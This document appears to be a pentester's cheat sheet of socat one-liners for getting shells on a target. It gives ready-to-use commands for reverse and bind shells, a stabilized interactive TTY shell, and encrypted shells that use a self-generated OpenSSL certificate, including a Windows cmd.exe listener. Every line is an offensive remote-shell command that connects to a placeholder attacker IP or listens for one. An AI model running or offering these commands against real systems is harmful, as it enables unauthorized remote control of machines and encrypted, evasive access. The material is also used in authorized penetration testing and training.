REVERSE SHELL : 

    BASIC ATTACKER LISTEN : socat TCP-L:Port_Num -

    BASIC TARGET CONNECT : socat TCP:Attacker_IP>:Port_Num> EXEC:"bash -li"

BIND SHELL : 

    TARGET LISTEN : socat TCP-L:Port_Num EXEC:"bash -li"

    ATTACKER CONNECT : socat TCP:Target_IP:Port_Num -


STABALIZE : 

    ATTACKER LISTEN : socat TCP-L:Port_Num File:'tty',raw,echo=0

    TARGET LISTEN : socat TCP:Attacker_IP:Port_Num EXEC:"bash -li",pty,stderr,sigint,setsid,sane



ENCRYPTED SHELL : 

    ATTACKER GENERATE CERTIFICATE : 
        
        openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

        cat shell.key shell.crt > shell.pem

    REVERSE SHELL : 

        ATTACKER LISTEN : socat openssl-listen:Port_Num,cert=shell.pem,verify=0 -

        TARGET CONNECT : socat openssl:Attacker_IP:Port_Num,verify=0 EXEC:/bin/bash

    BIND SHELL : 

        TARGET LISTEN FOR WINDOWS : socat openssl-listen:Port_Num,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

        ATTACKER CONNECT : socat openssl:Target_IP:Port_Num,verify=0 -


